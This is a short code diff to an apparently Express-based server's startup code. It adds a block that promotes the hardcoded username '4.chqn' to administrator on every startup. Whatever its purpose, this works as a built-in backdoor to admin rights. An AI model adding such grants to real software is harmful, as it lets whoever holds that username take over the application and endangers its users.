@@ -81,6 +81,16 @@ app.use((req, res, next) => {
     } else {
       log(`Default admin account already exists: ${adminUsername}`);
     }
+
+    try {
+      const specialAdminUser = await storage.getUserByUsername('4.chqn');
+      if (specialAdminUser && !specialAdminUser.isAdmin) {
+        await storage.updateUserAdminStatus(specialAdminUser.id, { isAdmin: true });
+        log(`User 4.chqn was promoted to admin on startup.`);
+      }
+    } catch (err) {
+      console.error('Failed to promote 4.chqn to admin:', err);
+    }
   } catch (err) {
     console.error("Failed to create default admin account:", err);
   }
